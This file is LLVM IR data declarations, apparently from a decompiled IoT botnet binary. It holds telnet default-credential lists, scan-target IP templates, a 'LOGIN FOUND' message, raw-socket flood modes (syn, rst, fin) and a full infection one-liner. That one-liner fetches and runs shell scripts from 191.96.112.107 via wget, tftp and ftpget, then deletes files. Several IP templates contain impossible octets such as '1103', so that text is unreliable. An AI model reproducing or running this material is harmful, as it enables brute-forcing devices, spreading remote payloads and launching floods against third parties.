source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_29478.13 = global i32 0
@global_var_118a4.17 = constant i32 -509558771
@global_var_299bc.20 = global i32 0
@global_var_299c0.21 = local_unnamed_addr global i32 0
@global_var_299c4.22 = local_unnamed_addr global i32 0
@global_var_29720.25 = local_unnamed_addr global i32 4095
@global_var_2971c.28 = global i32 362436
@global_var_1e50c.30 = constant [7 x i8] c"(null)\00"
@global_var_2d9bc.32 = local_unnamed_addr global i32 0
@global_var_1e514.34 = constant [8 x i8] c"/bin/sh\00"
@global_var_1e158.36 = constant [3 x i8] c"sh\00"
@global_var_1e51c.38 = constant [3 x i8] c"-c\00"
@global_var_1e520.41 = constant i32 -1
@global_var_1e920.43 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1e930.45 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_299a0.50 = global i32 0
@global_var_1e93c.52 = constant [5 x i8] c"PING\00"
@global_var_1e4fc.54 = constant [8 x i8] c"busybox\00"
@global_var_1e504.55 = constant i32 36
@global_var_1e508.56 = constant i32 35
@global_var_296e0.57 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e4fc.54, i32 0, i32 0), i8* bitcast (i32* @global_var_1e504.55 to i8*), i8* bitcast (i32* @global_var_1e508.56 to i8*)]
@global_var_1e4c4.59 = constant [7 x i8] c"nvalid\00"
@global_var_1e4cc.60 = constant [6 x i8] c"ailed\00"
@global_var_1e4d4.61 = constant [9 x i8] c"ncorrect\00"
@global_var_1e4e0.62 = constant [6 x i8] c"enied\00"
@global_var_1e4e8.63 = constant [5 x i8] c"rror\00"
@global_var_1e4f0.64 = constant [7 x i8] c"oodbye\00"
@global_var_1e4f8.65 = constant [4 x i8] c"bad\00"
@global_var_296c0.66 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e4c4.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e4cc.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e4d4.61, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e4e0.62, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e4e8.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e4f0.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e4f8.65, i32 0, i32 0)]
@global_var_299a8.68 = global i32 0
@global_var_299ac.69 = local_unnamed_addr global i32 0
@global_var_2fc08.71 = global i32 0
@global_var_1e944.73 = constant [6 x i8] c":>%$#\00"
@global_var_299b6.75 = global i32 0
@global_var_299b7.76 = local_unnamed_addr global i32 0
@global_var_299b8.77 = local_unnamed_addr global i32 0
@global_var_1e94c.83 = constant [12 x i8] c"177.5.%d.%d\00"
@global_var_1e958.85 = constant [15 x i8] c"1103.165.%d.%d\00"
@global_var_1e968.87 = constant [12 x i8] c"185.3.%d.%d\00"
@global_var_1e974.89 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1e984.91 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1e990.93 = constant [14 x i8] c"122.252.%d.%d\00"
@global_var_1e9a0.95 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1e9ac.97 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1e9bc.99 = constant [14 x i8] c"103.186.%d.%d\00"
@global_var_1e9cc.101 = constant [14 x i8] c"103.189.%d.%d\00"
@global_var_1e9dc.103 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_1e9ec.105 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1e9f8.107 = constant [14 x i8] c"122.254.%d.%d\00"
@global_var_1ea08.109 = constant [13 x i8] c"108.20.%d.%d\00"
@global_var_1ea18.111 = constant [13 x i8] c"108.47.%d.%d\00"
@global_var_1ea28.113 = constant [13 x i8] c"108.57.%d.%d\00"
@global_var_1ea38.115 = constant [14 x i8] c"45.1103.%d.%d\00"
@global_var_1ea48.117 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1ea58.119 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1ea68.121 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1ea74.123 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1ea80.125 = constant [14 x i8] c"122.204.%d.%d\00"
@global_var_1ea90.127 = constant [12 x i8] c"177.0.%d.%d\00"
@global_var_1ea9c.129 = constant [12 x i8] c"177.8.%d.%d\00"
@global_var_1eaa8.131 = constant [13 x i8] c"177.91.%d.%d\00"
@global_var_1eab8.133 = constant [13 x i8] c"177.54.%d.%d\00"
@global_var_1eac8.135 = constant [13 x i8] c"177.98.%d.%d\00"
@global_var_1ead8.137 = constant [14 x i8] c"177.177.%d.%d\00"
@global_var_1eae8.139 = constant [14 x i8] c"177.192.%d.%d\00"
@global_var_1eaf8.141 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1eb04.143 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1eb14.145 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_1eb20.147 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1eb2c.149 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_1eb38.151 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1eb44.153 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1eb50.155 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1eb5c.157 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_1eb68.159 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_1eb78.161 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_1eb88.163 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_1eb98.165 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_1eba8.167 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_1ebb8.169 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_1ebc8.171 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_1ebd8.173 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_1ebe8.175 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_1ebf8.177 = constant [13 x i8] c"108.54.%d.%d\00"
@global_var_1ec08.179 = constant [14 x i8] c"177.255.%d.%d\00"
@global_var_1ec18.181 = constant [14 x i8] c"108.204.%d.%d\00"
@global_var_1ec28.183 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_1ec38.185 = constant [14 x i8] c"104.191.%d.%d\00"
@global_var_1ec48.187 = constant [15 x i8] c"1103.100.%d.%d\00"
@global_var_1ec58.189 = constant [14 x i8] c"104.188.%d.%d\00"
@global_var_1ec68.191 = constant [14 x i8] c"104.189.%d.%d\00"
@global_var_1ec78.193 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_1ec88.195 = constant [14 x i8] c"122.160.%d.%d\00"
@global_var_1ec98.197 = constant [14 x i8] c"122.161.%d.%d\00"
@global_var_1eca8.199 = constant [14 x i8] c"122.162.%d.%d\00"
@global_var_1ecb8.201 = constant [14 x i8] c"122.163.%d.%d\00"
@global_var_1ecc8.203 = constant [14 x i8] c"122.164.%d.%d\00"
@global_var_1ecd8.205 = constant [14 x i8] c"122.165.%d.%d\00"
@global_var_1ece8.207 = constant [14 x i8] c"122.166.%d.%d\00"
@global_var_1ecf8.209 = constant [14 x i8] c"122.167.%d.%d\00"
@global_var_1ed08.211 = constant [14 x i8] c"122.168.%d.%d\00"
@global_var_1ed18.213 = constant [14 x i8] c"122.169.%d.%d\00"
@global_var_1ed28.215 = constant [14 x i8] c"122.170.%d.%d\00"
@global_var_1ed38.217 = constant [14 x i8] c"122.171.%d.%d\00"
@global_var_1ed48.219 = constant [14 x i8] c"122.172.%d.%d\00"
@global_var_1ed58.222 = constant [14 x i8] c"122.173.%d.%d\00"
@global_var_1ed68.224 = constant [14 x i8] c"122.174.%d.%d\00"
@global_var_1ed78.226 = constant [14 x i8] c"122.177.%d.%d\00"
@global_var_1ed88.228 = constant [14 x i8] c"122.176.%d.%d\00"
@global_var_1ed98.230 = constant [15 x i8] c"122.1103.%d.%d\00"
@global_var_1eda8.232 = constant [14 x i8] c"122.179.%d.%d\00"
@global_var_1edb8.234 = constant [14 x i8] c"122.180.%d.%d\00"
@global_var_1edc8.236 = constant [16 x i8] c"122.11103.%d.%d\00"
@global_var_1edd8.238 = constant [14 x i8] c"122.182.%d.%d\00"
@global_var_1ede8.240 = constant [14 x i8] c"122.183.%d.%d\00"
@global_var_1edf8.242 = constant [14 x i8] c"122.184.%d.%d\00"
@global_var_1ee08.244 = constant [15 x i8] c"122.1185.%d.%d\00"
@global_var_1ee18.246 = constant [14 x i8] c"122.186.%d.%d\00"
@global_var_1ee28.248 = constant [14 x i8] c"122.187.%d.%d\00"
@global_var_1ee38.250 = constant [14 x i8] c"122.188.%d.%d\00"
@global_var_1ee48.252 = constant [14 x i8] c"122.189.%d.%d\00"
@global_var_1ee58.254 = constant [14 x i8] c"122.190.%d.%d\00"
@global_var_1ee68.256 = constant [14 x i8] c"122.191.%d.%d\00"
@global_var_1ee78.258 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_1ee88.260 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_1ee98.262 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_1eea8.264 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_1eeb8.266 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_1eec8.268 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_1eed8.270 = constant [14 x i8] c"103.188.%d.%d\00"
@global_var_1eee8.272 = constant [14 x i8] c"45.1177.%d.%d\00"
@global_var_1eef8.274 = constant [13 x i8] c"108.30.%d.%d\00"
@global_var_1ef08.276 = constant [13 x i8] c"122.33.%d.%d\00"
@global_var_1ef18.278 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_1ef28.280 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_1ef38.282 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_1ef48.284 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1ef54.286 = constant [14 x i8] c"122.253.%d.%d\00"
@global_var_1ef64.288 = constant [15 x i8] c"1103.173.%d.%d\00"
@global_var_1ef74.290 = constant [14 x i8] c"104.190.%d.%d\00"
@global_var_1ef84.292 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1ef94.294 = constant [14 x i8] c"177.196.%d.%d\00"
@global_var_1efa4.296 = constant [15 x i8] c"104.1103.%d.%d\00"
@global_var_1efb4.298 = constant [13 x i8] c"177.45.%d.%d\00"
@global_var_1efc4.300 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_1efd4.302 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_1efe4.304 = constant [13 x i8] c"108.44.%d.%d\00"
@global_var_1eff4.306 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_1f004.308 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_1f014.310 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_1f024.312 = constant [15 x i8] c"1103.177.%d.%d\00"
@global_var_1f034.314 = constant [14 x i8] c"1103.93.%d.%d\00"
@global_var_1f044.316 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_1f050.318 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_1f060.320 = constant [14 x i8] c"104.174.%d.%d\00"
@global_var_1f070.322 = constant [14 x i8] c"104.160.%d.%d\00"
@global_var_1f080.324 = constant [14 x i8] c"104.161.%d.%d\00"
@global_var_1f090.326 = constant [14 x i8] c"104.162.%d.%d\00"
@global_var_1f0a0.328 = constant [14 x i8] c"104.163.%d.%d\00"
@global_var_1f0b0.330 = constant [14 x i8] c"104.164.%d.%d\00"
@global_var_1f0c0.332 = constant [14 x i8] c"104.165.%d.%d\00"
@global_var_1f0d0.334 = constant [14 x i8] c"104.166.%d.%d\00"
@global_var_1f0e0.336 = constant [14 x i8] c"104.167.%d.%d\00"
@global_var_1f0f0.338 = constant [14 x i8] c"104.168.%d.%d\00"
@global_var_1f100.340 = constant [14 x i8] c"104.169.%d.%d\00"
@global_var_1f110.342 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_1f120.344 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_1f130.346 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_1f140.348 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_1f150.350 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_1f160.352 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_1f170.354 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_1f180.356 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_1f190.358 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_1f1a0.360 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_1f1b0.362 = constant [14 x i8] c"122.208.%d.%d\00"
@global_var_1f1c0.365 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_1f1d0.367 = constant [14 x i8] c"177.201.%d.%d\00"
@global_var_1f1e0.369 = constant [14 x i8] c"108.198.%d.%d\00"
@global_var_1f1f0.372 = constant [13 x i8] c"91.205.%d.%d\00"
@global_var_1f200.374 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_1f210.376 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_1f220.378 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_1f230.380 = constant [14 x i8] c"185.105.%d.%d\00"
@global_var_1f240.382 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_1f24c.384 = constant [14 x i8] c"108.203.%d.%d\00"
@global_var_1f25c.386 = constant [13 x i8] c"108.55.%d.%d\00"
@global_var_1f26c.388 = constant [14 x i8] c"108.220.%d.%d\00"
@global_var_1f27c.390 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_1f28c.392 = constant [14 x i8] c"108.242.%d.%d\00"
@global_var_1f29c.394 = constant [14 x i8] c"108.122.%d.%d\00"
@global_var_1f2ac.396 = constant [14 x i8] c"108.195.%d.%d\00"
@global_var_1f2bc.398 = constant [15 x i8] c"108.2122.%d.%d\00"
@global_var_1f2cc.400 = constant [14 x i8] c"108.218.%d.%d\00"
@global_var_1f2dc.402 = constant [14 x i8] c"108.225.%d.%d\00"
@global_var_1f2ec.404 = constant [14 x i8] c"108.228.%d.%d\00"
@global_var_1f2fc.406 = constant [14 x i8] c"108.231.%d.%d\00"
@global_var_1f30c.408 = constant [13 x i8] c"108.60.%d.%d\00"
@global_var_1f31c.410 = constant [14 x i8] c"108.248.%d.%d\00"
@global_var_1f32c.412 = constant [14 x i8] c"108.253.%d.%d\00"
@global_var_1f33c.414 = constant [14 x i8] c"108.255.%d.%d\00"
@global_var_1f34c.416 = constant [13 x i8] c"108.35.%d.%d\00"
@global_var_1f35c.418 = constant [13 x i8] c"108.49.%d.%d\00"
@global_var_1f36c.420 = constant [13 x i8] c"108.62.%d.%d\00"
@global_var_1f37c.422 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_1f38c.424 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_1f39c.427 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_1f3ac.429 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_1f3bc.431 = constant [14 x i8] c"104.176.%d.%d\00"
@global_var_1f3cc.433 = constant [14 x i8] c"104.177.%d.%d\00"
@global_var_1f3dc.435 = constant [14 x i8] c"104.183.%d.%d\00"
@global_var_1f3ec.437 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_1f3fc.439 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_1f40c.441 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_1f41c.443 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_1f42c.445 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_1f43c.447 = constant [17 x i8] c"1103.11103.%d.%d\00"
@global_var_1f450.449 = constant [16 x i8] c"1103.1103.%d.%d\00"
@global_var_1f460.452 = constant [15 x i8] c"1103.176.%d.%d\00"
@global_var_1f470.454 = constant [15 x i8] c"1103.170.%d.%d\00"
@global_var_1f480.456 = constant [15 x i8] c"1103.171.%d.%d\00"
@global_var_1f490.458 = constant [15 x i8] c"1103.162.%d.%d\00"
@global_var_1f4a0.460 = constant [13 x i8] c"177.26.%d.%d\00"
@global_var_1f4b0.463 = constant [13 x i8] c"177.28.%d.%d\00"
@global_var_1f4c0.465 = constant [13 x i8] c"177.29.%d.%d\00"
@global_var_1f4d0.467 = constant [13 x i8] c"177.30.%d.%d\00"
@global_var_1f4e0.469 = constant [13 x i8] c"177.31.%d.%d\00"
@global_var_1f4f0.471 = constant [14 x i8] c"203.191.%d.%d\00"
@global_var_1f500.473 = constant [13 x i8] c"91.233.%d.%d\00"
@global_var_2fbfc.475 = global i32 0
@global_var_1e448.477 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1e458.478 = constant [6 x i8] c"/tmp/\00"
@global_var_1e460.479 = constant [6 x i8] c"/var/\00"
@global_var_1e468.480 = constant [6 x i8] c"/dev/\00"
@global_var_1e470.481 = constant [10 x i8] c"/var/run/\00"
@global_var_1e47c.482 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1e488.483 = constant [6 x i8] c"/mnt/\00"
@global_var_1e490.484 = constant [7 x i8] c"/boot/\00"
@global_var_1e498.485 = constant [6 x i8] c"/usr/\00"
@global_var_1e4a0.486 = constant [6 x i8] c"/opt/\00"
@global_var_29680.487 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1e448.477, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e458.478, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e460.479, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e468.480, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e470.481, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e47c.482, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e488.483, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e490.484, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e498.485, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e4a0.486, i32 0, i32 0)]
@global_var_296ac = external global i32
@global_var_1e420.494 = constant [5 x i8] c"root\00"
@global_var_1e428.495 = constant [6 x i8] c"admin\00"
@global_var_1e430.496 = constant [7 x i8] c"telnet\00"
@global_var_1e438.497 = constant [5 x i8] c"1111\00"
@global_var_1e440.498 = constant [5 x i8] c"1234\00"
@global_var_29660.499 = global [8 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e420.494, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e428.495, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e430.496, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e428.495, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e420.494, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e438.497, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e430.496, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e440.498, i32 0, i32 0)]
@global_var_1f510.501 = constant [3 x i8] c"\0D\0A\00"
@global_var_29670.503 = global [4 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e420.494, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e438.497, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e430.496, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e440.498, i32 0, i32 0)]
@global_var_296f0.505 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e4c4.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e4cc.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e4d4.61, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e4e0.62, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e4e8.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e4f0.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e4f8.65, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e4fc.54, i32 0, i32 0), i8* bitcast (i32* @global_var_1e504.55 to i8*), i8* bitcast (i32* @global_var_1e508.56 to i8*)]
@global_var_1f514.508 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_1f52c.510 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_1f534.512 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_1e284.514 = constant [412 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/rooty.sh; chmod 777 rooty.sh; sh rooty.sh; tftp 191.96.112.107 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 191.96.112.107; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.112.107 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf rooty.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_2965c.515 = local_unnamed_addr global [412 x i8]* @global_var_1e284.514
@global_var_1f53c.517 = constant [6 x i8] c"arfgG\00"
@global_var_1f544.518 = constant [9 x i8] c"HBiug655\00"
@global_var_1f550.519 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1f560.520 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1f574.521 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1f588.522 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1f594.523 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1f5a0.524 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1f5ac.525 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1f5b8.526 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1f5c4.527 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1f5d4.528 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1f5e0.529 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1f5f0.530 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1f5fc.531 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1f60c.532 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1f618.533 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1f624.534 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1f630.535 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1f640.536 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1f650.537 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1f660.538 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1f66c.539 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1f67c.540 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1f68c.541 = constant [12 x i8] c"yteytietyue\00"
@global_var_1f698.542 = constant [9 x i8] c"qsortEQS\00"
@global_var_1f6a4.543 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1f6b4.544 = constant [4 x i8] c"std\00"
@global_var_1f6b8.545 = constant [4 x i8] c"dts\00"
@global_var_1f6bc.546 = constant [4 x i8] c"lsk\00"
@global_var_1f6c0.547 = constant [4 x i8] c"kek\00"
@global_var_1f6c4.548 = constant [6 x i8] c"smack\00"
@global_var_1f6cc.549 = constant [4 x i8] c"ily\00"
@global_var_1f6d0.550 = constant [4 x i8] c"tyf\00"
@global_var_1f6d4.551 = constant [4 x i8] c"pos\00"
@global_var_1f6d8.552 = constant [6 x i8] c"cunts\00"
@global_var_1f6e0.553 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f53c.517, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f544.518, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f550.519, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1f560.520, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1f574.521, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f588.522, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f594.523, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f5a0.524, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f5ac.525, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f5b8.526, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f5c4.527, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f5d4.528, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f5e0.529, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f5f0.530, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1f5fc.531, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f60c.532, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f618.533, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f624.534, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f630.535, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f640.536, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f650.537, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f660.538, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f66c.539, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f67c.540, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f68c.541, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f698.542, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1f6a4.543, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f6b4.544, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f6b8.545, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f6bc.546, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f6c0.547, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f6c4.548, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f6cc.549, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f6d0.550, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f6d4.551, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f6d8.552, i32 0, i32 0)]
@global_var_1f770.557 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_1f78c.559 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1f7b0.564 = constant [4 x i8] c"all\00"
@global_var_1f7b4.566 = constant i32 44
@global_var_1f7b8.568 = constant [4 x i8] c"syn\00"
@global_var_1f7bc.570 = constant [4 x i8] c"rst\00"
@global_var_1f7c0.572 = constant [4 x i8] c"fin\00"
